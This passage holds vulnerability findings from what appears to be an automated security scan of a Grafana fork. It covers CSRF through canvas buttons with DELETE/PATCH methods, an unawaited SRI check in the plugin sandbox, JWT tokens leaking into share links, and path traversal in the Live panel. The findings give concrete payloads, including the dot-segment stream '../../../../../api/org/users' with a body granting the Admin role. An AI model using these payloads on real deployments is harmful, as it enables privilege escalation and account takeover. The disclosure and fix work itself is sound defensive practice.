   getRequest() copies api.method (a free-form string from stored dashboard JSON) verbatim into the BackendSrvRequest; it is never compared with the HttpRequestMethod enum (GET/POST/PUT). api.data is interpolated and sent as the body for every non-GET method (getData, 79-86), api.headerParams become arbitrary headers, and a relative endpoint such as /api/org/users/5 is only sanitizeUrl'd and made absolute on the Grafana origin by createAbsoluteUrl (88-97). Only X-Grafana-Action: 1 is added; nothing restricts method or target path. This is the code the fix must change.
2. [public/app/plugins/panel/canvas/editor/element/utils.ts:13–34](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/plugins/panel/canvas/editor/element/utils.ts#L13-L34)
   callApi() hands the request to getBackendSrv().fetch() with no permission check (no canExecuteActions), no confirmation dialog and no destination allow-list; the response body is discarded and only a success toast (api.successMessage, attacker-chosen) is shown.
3. [public/app/features/canvas/elements/button.tsx:57–61](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/canvas/elements/button.tsx#L57-L61)
   ButtonDisplay.onClick calls callApi(data.api) for whoever clicks the element. prepareData (143-154) passes buttonConfig.api.method through unchanged, only defaulting a missing value, so 'DELETE' or 'PATCH' written into the dashboard JSON reaches callApi.
4. [public/app/plugins/panel/canvas/editor/element/APIEditor.tsx:19–26](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/plugins/panel/canvas/editor/element/APIEditor.tsx#L19-L26)
   APIEditorConfig.method is typed string, not HttpRequestMethod. The editor UI (httpMethodOptions 39-43, RadioButtonGroup 177-178) offers only GET/POST/PUT, so the enum is enforced by the UI alone; an Editor who edits the dashboard JSON model (dashboard-scene/settings/JsonModelEditView.tsx) or the panel JSON (features/inspector/InspectJSONTab.tsx) stores any verb.
5. [public/app/core/utils/fetch.ts:194–208](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/core/utils/fetch.ts#L194-L208)
   parseCredentials() returns 'same-origin' by default, so the request to the Grafana API carries the clicking user's grafana_session cookie; the Origin header is the Grafana origin, so the server CSRF check (Origin/Referer == Host) is satisfied. parseHeaderByMethodFactory (41-60) additionally sets content-type: application/json for PATCH when none is given, so a PATCH body needs no custom header.
6. [public/app/features/canvas/runtime/scene.tsx:118–119](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/canvas/runtime/scene.tsx#L118-L119)
   Inline editing (which the canvas docs say suppresses the button's API call) is enabled only when options.inlineEditing && dashboard.editable; both are dashboard/panel JSON values authored by the attacking Editor, not a user permission or operator setting, so the attacker simply turns inline editing off.
7. [conf/defaults.ini:569–570](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/conf/defaults.ini#L569-L570)
   The only server-side protection for X-Grafana-Action requests is documented as 'Comma-separated list of paths for POST/PUT URL in actions. Empty will allow anything that is not on the same origin' (docs/sources/setup-grafana/configure-grafana/_index.md:828-831: 'using the POST verb ... If the value is set, you can also send authenticated POST requests to the local server'). The documented control is method-specific; DELETE and PATCH are outside it, and the frontend never prevents them from being sent. The Go middleware is absent from the checkout; this is the finding's stated assumption.
8. [public/app/features/dashboard-scene/scene/setDashboardPanelContext.ts:205–207](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard-scene/scene/setDashboardPanelContext.ts#L205-L207)
   For comparison: field/element actions are executable only when canExecuteActions() (dashboard.canEditDashboard()) is true and are shown behind a confirmation modal; the canvas Button path consults neither, so any Viewer or Admin click fires the request immediately.

## Impact
A single click by an Org Admin lets the Editor PATCH their own org role to Admin (full read/write of the organisation's dashboards, datasources, users and alerting, hence confidentiality), or DELETE users, datasources, folders, dashboards and alerting configuration with the victim's authority (integrity and availability). Impact stays inside the Grafana instance.

## Reproduction steps
1. Attacker: authenticated Editor (threat-model adversary 3, which names 'forced requests via panel actions/canvas buttons'). They save a dashboard containing a canvas Button whose api.method is DELETE or PATCH and whose endpoint is a same-origin /api path, with inlineEditing off; the Button element type and all other defaults suffice (showAdvancedTypes defaults true, actions_allow_post_url defaults empty). A higher-privileged victim (Org Admin / Server Admin) opens the dashboard and clicks what looks like an ordinary control; the browser sends the request with the victim's cookie, Origin matches so CSRF passes, and the method is outside the documented POST/PUT action allow-list. Explicit assumption: the server-side X-Grafana-Action middleware (Go, not in checkout) covers only POST/PUT as conf/defaults.ini:569 and docs/sources/setup-grafana/configure-grafana/_index.md:828-831 state; if it rejected every unsafe method the attack would fail. The project does not concede this capability to Editors: the allow-list exists to deny same-origin writes from actions.

## Recommended fix
1. getRequest()/prepareData() accept any string as the HTTP method and forward it to backendSrv.fetch, so stored dashboard JSON can select DELETE/PATCH (or any other verb) that the server-side X-Grafana-Action allow-list does not cover. Fix criteria: The request method must be validated against an explicit allow-list (GET/POST/PUT, matching HttpRequestMethod) at request-build time, with any other stored value rejected rather than defaulted; the same check must exist in features/actions buildActionRequest. Verification: a dashboard JSON with api.method 'DELETE' or 'PATCH' must produce no network request from the button click.
2. Same-origin button requests carry the clicking user's session cookie and are subject neither to the canExecuteActions permission gate and confirmation dialog that field actions have, nor to a server-side allow-list covering every unsafe method, while the documentation promises 'unauthenticated' calls. Fix criteria: Button API calls must either be sent without credentials / refused for same-origin API paths, or be gated like field actions (viewer permission check and explicit confirmation) and covered by the server-side action allow-list for every non-safe method (anything other than GET/HEAD/OPTIONS). Verification: a Viewer or Admin clicking an Editor-authored button cannot cause a state-changing authenticated request to the Grafana API outside the configured allow-list, for any HTTP verb.

---
**Severity:** HIGH
**Status:** Open
**Category:** Cross-Site Request Forgery
**CWE:** [CWE-352](https://cwe.mitre.org/data/definitions/352.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** LOW
**User interaction:** PASSIVE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** HIGH
**Vulnerable system availability impact:** HIGH
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/grafanna
**Branch:** main
**Commit:** b5926dce1d4e96c91966744d89cd016af3f44b27
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_019iXQSLyZoKTnm63UmVYEHf&finding=scan_012mSAEzQmHjt1JiL4MG5bXM-5256210

---

# Sandbox plugin SRI check never fails: async verifySRI result used without await

## Details
When the pluginsSriChecks feature toggle is enabled, Grafana is meant to verify each plugin's module.js against the moduleHash the backend derives from the plugin's signed MANIFEST, so that a bundle altered between the backend's signature verification and the browser (on the plugins CDN, in a reverse proxy or cache in front of Grafana, or on disk after startup) is not executed. For plugins listed in security.enable_frontend_sandbox_for_plugins this is implemented in public/app/features/plugins/sandbox/codeLoader.ts: getPluginCode() fetches the module text and calls verifySRI().

verifySRI is `async` (it awaits crypto.subtle.digest) and returns Promise<boolean>. Both call sites (lines 58 and 77) test `if (!verifySRI(...))` without awaiting. A Promise object is truthy, so the negation is always false and the `throw new Error('Invalid SRI for plugin module file')` branch is unreachable. The digest is computed and discarded, and sandboxPluginLoader.ts evaluates the fetched code in the near-membrane realm unconditionally. The shipped chunk public/build/pluginSandbox.76f7fda88ac9b9530e06.js contains the same unawaited call.

The non-sandboxed path (importPluginModule.ts lines 52-63) injects moduleHash into the SystemJS import-map integrity and is assumed to be enforced by SystemJS; for sandboxed plugins control leaves that path at line 72 before SystemJS is used, so codeLoader's inert check is the only SRI enforcement for exactly the plugins the documentation says to sandbox because they are least trusted.

Attack path: an attacker able to alter the bytes served for a sandboxed plugin's module.js - a compromised or poisoned plugins CDN (config.pluginsCDNBaseURL, an external origin), a cache or proxy between Grafana and the browser, or a write to the plugin directory after the backend verified the manifest at startup - delivers modified plugin code. With the check inert, that code runs for every signed-in user who loads the plugin, inside the sandbox but with the plugin's normal capabilities: the sandbox does not distort fetch/XMLHttpRequest, so the code makes authenticated same-origin API requests as the victim.

This holds only in deployments where the operator has enabled pluginsSriChecks and listed the plugin in enable_frontend_sandbox_for_plugins; in those deployments the shipped hardening is silently bypassed.

## Evidence
1. [public/app/features/plugins/sandbox/codeLoader.ts:51–89](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/plugins/sandbox/codeLoader.ts#L51-L89)
   getPluginCode tests `if (!verifySRI(pluginCode, meta.moduleHash))` at line 58 (CDN-hosted module) and line 77 (locally served module) without await. verifySRI is async, so the expression is a Promise object; `!promise` is always false and the `throw new Error('Invalid SRI for plugin module file')` branches are unreachable. The fetched text is then transformed and returned to sandboxPluginLoader, which evaluates it (sandboxEnvironment.evaluate) regardless of hash. The shipped chunk public/build/pluginSandbox.76f7fda88ac9b9530e06.js carries the same `if(!rr(p,e.moduleHash))throw` with `rr` async.
2. [public/app/features/plugins/sandbox/codeLoader.ts:92–110](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/plugins/sandbox/codeLoader.ts#L92-L110)
   verifySRI returns Promise<boolean>: it short-circuits to true when pluginsSriChecks is off or moduleHash is empty, otherwise awaits crypto.subtle.digest and compares `${algorithm}-${base64}` to moduleHash. The boolean is only ever delivered through the Promise the callers discard; a rejection (e.g. unknown algorithm) likewise becomes an unhandled rejection rather than a load failure.
3. [public/app/features/plugins/sandbox/sandboxPluginLoader.ts:195–210](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/plugins/sandbox/sandboxPluginLoader.ts#L195-L210)
   doImportPluginModuleInSandbox obtains the module text via `pluginCode = await getPluginCode(meta)` and passes it to `sandboxEnvironment.evaluate(pluginCode)`; this is the only fetch-and-evaluate path for sandboxed plugins and it never goes through SystemJS, so no other integrity check applies to it.
4. [public/app/features/plugins/importer/importPluginModule.ts:51–72](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/plugins/importer/importPluginModule.ts#L51-L72)
   When pluginsSriChecks is on, importPluginModule injects moduleHash into the SystemJS import-map integrity (lines 52-63) and then, for sandboxed plugins, returns importPluginModuleInSandbox at line 72 before SystemJS.import is reached. The non-sandbox path's enforcement therefore rests on SystemJS honouring import-map integrity (an assumption about the bundled SystemJS, not verified in this checkout); the sandbox path's only enforcement is codeLoader's own inert check.
5. [docs/sources/setup-grafana/configure-grafana/feature-toggles/index.md:53](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/docs/sources/setup-grafana/configure-grafana/feature-toggles/index.md#L53)
   pluginsSriChecks is documented as 'Enables SRI checks for plugin assets' with no default-on marker; an operator enabling it expects plugin bundles whose hash does not match the signed manifest to be rejected. docs/sources/administration/plugin-management/plugin-frontend-sandbox.md recommends the sandbox for 'Plugins from untrusted sources', the very plugins this path loads.

## Impact
Modified plugin code executes in every affected user's browser with the plugin's capabilities. fetch and XMLHttpRequest are not distorted by the sandbox (distortions.ts, documentSandbox.ts), so the code issues authenticated same-origin requests as the victim: reading any dashboard, datasource query result or API resource the victim can reach (C:H) and creating or altering dashboards, alert rules and other state within the victim's permissions (I:H). Availability impact is limited to breaking the plugin or page (A:L).

## Reproduction steps
1. The attacker must hold a position from which the served module.js can be modified (plugins CDN origin, an intermediary, or the plugin directory after startup) - a deployment condition, hence AT:P - and the deployment must have pluginsSriChecks on and the plugin sandboxed, which is the hardening this defect bypasses rather than an attacker-side obstacle. Given that position nothing further is needed: no credentials, no bypass of any working control (AC:L), and the code runs when any signed-in victim views a page using the plugin (UI:P).

## Recommended fix
verifySRI is asynchronous but both call sites in getPluginCode use its returned Promise as a boolean without awaiting it, so the SRI mismatch branch is unreachable and sandboxed plugin code is never rejected. Fix criteria: With pluginsSriChecks enabled and a non-empty meta.moduleHash, getPluginCode rejects (and the sandbox loader does not evaluate the code) whenever the fetched module.js digest does not match moduleHash, on both the CDN and the locally served branches; a digest failure or unsupported algorithm also fails the load rather than passing silently. Covered by a unit test that feeds mismatching content and asserts the 'Invalid SRI' rejection, and matching content loads.

---
**Severity:** HIGH
**Status:** Open
**Category:** Integrity check bypass
**CWE:** [CWE-354](https://cwe.mitre.org/data/definitions/354.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** PASSIVE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** HIGH
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/grafanna
**Branch:** main
**Commit:** b5926dce1d4e96c91966744d89cd016af3f44b27
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_019iXQSLyZoKTnm63UmVYEHf&finding=scan_012mSAEzQmHjt1JiL4MG5bXM-5256209

---

# Share link and short URL builders copy the JWT auth_token from the current URL

## Details
Grafana's JWT URL login ([auth.jwt] url_login = true; docs/sources/setup-grafana/configure-access/configure-authentication/jwt/index.md) authenticates /d/<uid>?auth_token=<JWT>. The frontend deliberately keeps that parameter in the URL (handleRedirectTo.ts:11-15 returns early for auth_token; nothing else strips it) and backend_srv.ts:261-267 re-sends it as the configured JWT header on every request, so for the whole session the live bearer credential sits in location.search.

The scenes dashboard share flow — the only one shipped, since DashboardPageProxy.tsx:11-13 renders DashboardScenePage unconditionally — rebuilds share links from that query string. createDashboardShareUrl() (shortLinks.ts:126-142) passes locationService.getLocation().search as currentQueryParams to getDashboardUrl() (getDashboardUrl.ts:62-77), which parses it with the generic locationSearchToObject (urlUtil.parseKeyValue, recovered from the @grafana/runtime source map) and deletes only 'shareView' before urlUtil.renderUrl. The legacy builder it replaced (ShareModal/utils.ts:54-56) explicitly deleted 'auth_token' ("Token is unique to the authenticated identity and should not be shared with the URL") and the project tests that behaviour (ShareModal/utils.test.ts:32); the scenes builder has no equivalent and the legacy builder is no longer reachable from any route.

Consequently, when a user in a URL-login session clicks the toolbar Share button (ShareButton.tsx -> buildShareUrl, ShareButton/utils.ts:21-38), presses 'p u' on a panel (keyboardShortcuts.ts:74-79), opens the Share internally drawer (ShareInternally extends ShareLinkTab; ShareLinkTab.buildUrl, lines 67-110), or copies the rendered-image link (SharePanelPreview.tsx:200-209, absoluteImageUrl built from window.location.search at ShareLinkTab.tsx:98-107), the produced URL carries their JWT. Because DEFAULT_SHARE_LINK_CONFIGURATION.useShortUrl is true, the default toolbar path additionally POSTs the full relative path, token included, to /api/short-urls (shortLinks.ts:37-42) or the k8s ShortURL spec.path (shortLinks.ts:50-60); the documented API stores the path verbatim and /goto/<uid> redirects to it, so the credential is persisted server-side and any holder of the short link is redirected to the token-bearing URL.

Impact: any recipient of the shared link or short link authenticates as the sharer for the JWT's lifetime (full read/write within the sharer's role); the token also lands in the short-URL table, recipients' browser history and intermediary logs. This holds only in deployments that enable url_login (off in conf/defaults.ini); in such deployments the sharing user performs only the routine Share action.

Assumptions: @grafana/runtime locationSearchToObject and @grafana/data urlUtil.renderUrl round-trip all query parameters (confirmed for the former from the shipped source map); the backend /api/short-urls stores the submitted path verbatim, as its documented contract states.

## Evidence
1. [public/app/features/dashboard-scene/utils/getDashboardUrl.ts:62–77](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard-scene/utils/getDashboardUrl.ts#L62-L77)
   Primary location. getDashboardUrl() parses options.currentQueryParams (the live location.search) with locationSearchToObject, deletes only 'shareView', merges updateQuery and renders the URL; auth_token is carried through into every share, image and short-URL path.
2. [public/app/core/utils/shortLinks.ts:126–141](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/core/utils/shortLinks.ts#L126-L141)
   createDashboardShareUrl() passes locationService.getLocation().search as currentQueryParams, so the share link reproduces the full current query string including auth_token.
3. [public/app/core/utils/shortLinks.ts:37–60](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/core/utils/shortLinks.ts#L37-L60)
   createShortLink()/createShortLinkLegacy() POST the full relative path (with auth_token) to /api/short-urls or as k8s ShortURL spec.path, persisting the credential server-side; /goto/<key> redirects any holder to it.
4. [public/app/features/dashboard-scene/sharing/ShareButton/utils.ts:15–37](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard-scene/sharing/ShareButton/utils.ts#L15-L37)
   buildShareUrl() is the toolbar Share action; DEFAULT_SHARE_LINK_CONFIGURATION.useShortUrl is true, so by default the token-bearing path is sent to the short-URL API and the short link copied to the clipboard.
5. [public/app/features/dashboard-scene/scene/keyboardShortcuts.ts:74–78](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard-scene/scene/keyboardShortcuts.ts#L74-L78)
   The 'p u' panel keybinding invokes the same buildShareUrl path.
6. [public/app/features/dashboard-scene/sharing/ShareLinkTab.tsx:67–109](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard-scene/sharing/ShareLinkTab.tsx#L67-L109)
   ShareLinkTab.buildUrl() (also the base of ShareInternally) uses createDashboardShareUrl for the link and getDashboardUrl({currentQueryParams: window.location.search}) for the rendered-image URL; both are offered for copying.
7. [public/app/features/dashboard-scene/sharing/panel-share/SharePanelPreview.tsx:200–209](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard-scene/sharing/panel-share/SharePanelPreview.tsx#L200-L209)
   ClipboardButton copies absoluteImageUrl, the /render URL built from window.location.search, including auth_token.
8. [public/app/features/dashboard/components/ShareModal/utils.ts:54–56](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard/components/ShareModal/utils.ts#L54-L56)
   The legacy builder explicitly deletes auth_token, documenting that the token is unique to the authenticated identity and must not be shared; the scenes replacement dropped this control.
9. [public/app/features/dashboard/components/ShareModal/utils.test.ts:32](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard/components/ShareModal/utils.test.ts#L32)
   Project test asserting that auth_token is stripped from built share params — the project defends exactly this surface.
10. [public/app/features/dashboard/containers/DashboardPageProxy.tsx:11–13](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard/containers/DashboardPageProxy.tsx#L11-L13)
   Every dashboard route renders DashboardScenePage unconditionally, so the scenes share flow is the only shipped path and the legacy stripping builder is unreachable.
11. [public/app/core/navigation/handleRedirectTo.ts:11–14](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/core/navigation/handleRedirectTo.ts#L11-L14)
   The frontend intentionally leaves auth_token in the URL for URL-login sessions, so it remains in location.search when the user clicks Share.
12. [public/app/core/services/backend\_srv.ts:261–266](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/core/services/backend_srv.ts#L261-L266)
   The auth_token read from the URL is re-sent as the JWT header on every request, establishing that the value copied into share links is the live session credential.

## Impact
The recipient holds the sharer's JWT and acts with the sharer's full identity and role for the token's lifetime: reads everything the sharer can and modifies dashboards, alert rules and settings within that role. The token is also persisted in the short-URL store. Availability not directly affected.

## Reproduction steps
1. In a deployment with [auth.jwt] url_login enabled, the victim opens a dashboard via the documented ?auth_token= URL, then performs the routine Share action (toolbar button, 'p u', Share internally drawer, or Copy image link) and sends the resulting link or /goto short link to a recipient. The recipient needs no Grafana privileges and no technical steps: opening the link (or following the short-link redirect) authenticates them as the sharer. The victim's URL-login session state and the share action are the attack requirements; the attacker merely receives the link.

## Recommended fix
getDashboardUrl()/createDashboardShareUrl() reproduce the entire current query string in share, rendered-image and short URLs, stripping only shareView; the auth_token credential is carried along and persisted via the short-URL API, whereas the legacy builder explicitly removed it. Fix criteria: Share links, rendered-image links and the path sent to the short-URL API must never contain auth_token (or other credential-bearing parameters) regardless of the current URL: a dashboard opened with ?auth_token=X must yield share, image and short links without X, with a test equivalent to the legacy buildParams auth_token case covering the scenes builder.

---
**Severity:** HIGH
**Status:** Open
**Category:** Information exposure
**CWE:** [CWE-522](https://cwe.mitre.org/data/definitions/522.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** ACTIVE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** HIGH
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/grafanna
**Branch:** main
**Commit:** b5926dce1d4e96c91966744d89cd016af3f44b27
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_019iXQSLyZoKTnm63UmVYEHf&finding=scan_012mSAEzQmHjt1JiL4MG5bXM-5256208

---

# Live panel Influx publish builds request URL from unvalidated dashboard-authored stream name

## Details
The Live panel (public/app/plugins/panel/live, shipped in the core bundle via built_in_plugins.ts) stores a channel address `{scope, stream, path}` and an optional `message` in its panel options, both authored by whoever edits the dashboard. When `publish` is `influx`, every viewer of the dashboard is shown a Publish button (LivePanel.renderBody → renderPublish, no role gate); clicking it runs `getBackendSrv().post(`api/live/push/${addr.stream}`, body)` (LivePublish.tsx:40) where `addr.stream` is the raw stored string and `body` is the stored `message`.

The only guard on this branch is `addr?.scope !== 'stream'`. `isValidLiveChannelAddress` (applied in LivePanel.loadChannel; recovered from the @grafana/data source map) is `!!(addr?.path && addr.stream && addr.scope)` — a truthiness check; the stream segment is never validated against the Live channel grammar and is not URL-encoded. backend_srv's `post()` does not set `validatePath`; `parseRequestOptions` treats any URL not matching /^http/ as local and passes it through (adding only X-Grafana-Org-Id); `parseUrlFromOptions` hands the raw string to `fetch()`, which resolves it against `<base href="[[.AppSubUrl]]/">`. Dot-segment normalisation therefore turns a stream value such as `../../../../../api/org/users` into `POST /api/org/users`, sent with content-type application/json, the victim's grafana_session cookie, a same-origin Origin header (so the server's Origin-based CSRF middleware — the shipped control for forged state-changing requests — accepts it) and an attacker-chosen body: `message` as a string is sent verbatim (and survives any CodeEditor onBlur re-save unchanged); as an object it is JSON.stringified.

Attack: an Editor saves a dashboard containing a `live` panel with `publish: "influx"`, `channel: {scope:"stream", stream:"../../../../../api/org/users", path:"x"}` and `message: '{"loginOrEmail":"<attacker>","role":"Admin"}'`. An Org Admin who opens the dashboard and clicks the panel's Publish button adds the attacker to the org as Admin. Equivalent bodies target `/api/admin/users` (Server Admin victim creates a new admin), `/api/folders/{uid}/permissions`, `/api/dashboards/uid/{uid}/permissions`, `/api/datasources`, `/api/serviceaccounts`, etc. Only the request is forced; the response is not readable by the attacker.

The JSON publish branch (`getGrafanaLiveSrv().publish`) is not affected: it posts a fixed path with the channel in the body.

Condition under which this holds: the `live` panel is `state: "alpha"` (plugin.json), and alpha panels are included in the server-provided `config.panels` only when `enable_alpha = true` (`[panels]`/`[plugins]`, default false in conf/defaults.ini; docs: "Set to true if you want to test alpha panels that are not yet ready for general usage"). public/app/core/config.ts:20 (`hasAlphaPanels` keyed on the alpha `debug` panel's presence) confirms the frontend relies on that server-side listing; without it `importPanelPlugin('live')` throws "Plugin live not found". This is a feature-maturity flag, not a documented security control: the docs do not describe enabling alpha panels as a security-relevant choice. Grafana Live itself does not need to be connected: the push is a plain HTTP POST, and `this.isValid` is `!!getGrafanaLiveSrv()`, always set at boot (app.ts:234).

Assumptions: the backend CSRF middleware (Go, not in checkout) accepts same-origin requests, per the documented `csrf_trusted_origins` origin-based design; the server lists alpha panels in frontend settings only under `enable_alpha` (Go, not in checkout; corroborated by core/config.ts:20).

## Evidence
1. [public/app/plugins/panel/live/LivePublish.tsx:34–41](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/plugins/panel/live/LivePublish.tsx#L34-L41)
   onPublishClicked in Influx mode checks only addr?.scope === 'stream' and then runs getBackendSrv().post(`api/live/push/${addr.stream}`, body). addr.stream is the dashboard-stored string, not validated against the Live channel grammar and not URL-encoded; body is the stored options.message (string sent verbatim, object JSON.stringified). This is the line the fix must change.
2. [public/app/plugins/panel/live/LivePanel.tsx:185–196](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/plugins/panel/live/LivePanel.tsx#L185-L196)
   renderPublish passes options.message as body and this.state.addr (the stored options.channel) to LivePublish. renderBody (211-233) renders it whenever options.publish is 'json' or 'influx' with no role or permission gate, so every viewer of the dashboard — including Org/Server Admins — gets the Publish button.
3. [public/app/plugins/panel/live/LivePanel.tsx:87–122](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/plugins/panel/live/LivePanel.tsx#L87-L122)
   loadChannel accepts options.channel after isValidLiveChannelAddress(addr) — recovered from public/build/6540.*.js.map (packages/grafana-data/src/types/live.ts): `return !!(addr?.path && addr.stream && addr.scope)`, a truthiness check only. live.getStream(addr) (features/live/centrifuge/service.ts getChannel) never throws for odd strings, so state.addr is set and render() proceeds to renderBody. isValid is !!getGrafanaLiveSrv(), always set by initGrafanaLive() in app.ts:234.
4. [public/app/core/services/backend\_srv.ts:294–326](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/core/services/backend_srv.ts#L294-L326)
   parseRequestOptions: isLocalUrl (core/utils/query.ts:42, `!url.match(/^http/)`) is true for the relative string, so it only adds X-Grafana-Org-Id and strips a leading '/'; no dot-segment or path validation. post() (600-602) does not set validatePath.
5. [public/app/core/utils/fetch.ts:179–191](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/core/utils/fetch.ts#L179-L191)
   parseUrlFromOptions applies validatePath only when options.validatePath is true; otherwise the raw string `api/live/push/../../../../../api/org/users` is handed to fetch(). Resolved against <base href="[[.AppSubUrl]]/"> (public/views/index.html:15), WHATWG dot-segment removal yields /api/org/users under the app sub-URL.
6. [public/app/core/utils/fetch.ts:41–57](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/core/utils/fetch.ts#L41-L57)
   parseHeaderByMethodFactory('post') sets content-type: application/json when none is given; parseBody (107-120) sends a string body verbatim or JSON.stringify()s an object. The editor therefore controls the full JSON body of the forced POST, and a string-typed message survives a CodeEditor onBlur save unchanged.
7. [public/app/core/config.ts:20](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/core/config.ts#L20)
   hasAlphaPanels is derived from whether the alpha 'debug' panel is present in config.panels, confirming that alpha panels (live is state: 'alpha' in its plugin.json) are listed by the server only when enable_alpha is set — the condition under which importPanelPlugin('live') resolves and this path is reachable.

## Impact
The path and JSON body of the forced POST are fully attacker-chosen, so a single click by an Org Admin on `POST /api/org/users {loginOrEmail, role: Admin}` makes the Editor an Org Admin, and a Server Admin victim on `/api/admin/users` yields a new server admin: the organisation's authorization state is fully compromised (integrity HIGH), and the resulting Admin role gives the attacker read access to every dashboard, datasource configuration and query result in the org (confidentiality HIGH as a direct consequence of the escalation, not of reading the forced response, which stays unreadable). Availability is not directly affected.

## Reproduction steps
1. Attacker is an authenticated Editor (dashboard author, PR:L) who stores a live panel with scope 'stream', a dot-segment stream value resolving to an arbitrary same-origin API path, Influx publish mode and a string JSON message. A higher-privileged user (Org Admin / Server Admin) opens the dashboard and clicks the panel's Publish button (UI:A); the browser POSTs the attacker's body to the attacker's chosen endpoint with the victim's session and a same-origin Origin header. No special timing or guessing is needed (AC:L). Attack requirements: the deployment must have alpha panels enabled (`enable_alpha = true`, a non-default feature-maturity flag) so the `live` panel resolves, and the victim must hold the role the targeted endpoint requires (AT:P).

## Recommended fix
1. LivePublish interpolates the stored channel stream segment into a request path without validating it against the Live channel grammar or URL-encoding it, so a dashboard author controls the path of a request issued with the viewer's session. Fix criteria: The Influx publish request must only ever reach `/api/live/push/<stream>` for a stream matching the Live channel identifier grammar (ASCII alphanumerics, `_`, `-`); a stream containing `/`, `.`, `?`, `#` or percent-encodings must be rejected before any request is made (e.g. validate with parseLiveChannelAddress / a strict regex and encodeURIComponent the segment). Verification: a panel with stream `../../../../../api/org/users` must produce no request, and the browser network log must never show a push request outside `/api/live/push/`.
2. backend_srv.post() does not opt into path validation, so any caller that builds a relative API path from dashboard- or datasource-authored data can be redirected by dot-segments. Fix criteria: Requests built from dashboard-authored or datasource-authored strings must pass `validatePath: true` (or be constructed via a helper that encodes each segment) so that `..`, `?` and `#` in a segment cannot change the resolved endpoint; verification is that backendSrv rejects or encodes such segments for the live push call.

---
**Severity:** HIGH
**Status:** Open
**Category:** Cross-site request forgery
**CWE:** [CWE-99](https://cwe.mitre.org/data/definitions/99.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** LOW
**User interaction:** ACTIVE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** HIGH
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/grafanna
**Branch:** main
**Commit:** b5926dce1d4e96c91966744d89cd016af3f44b27
**Date created:** 2026-10-18
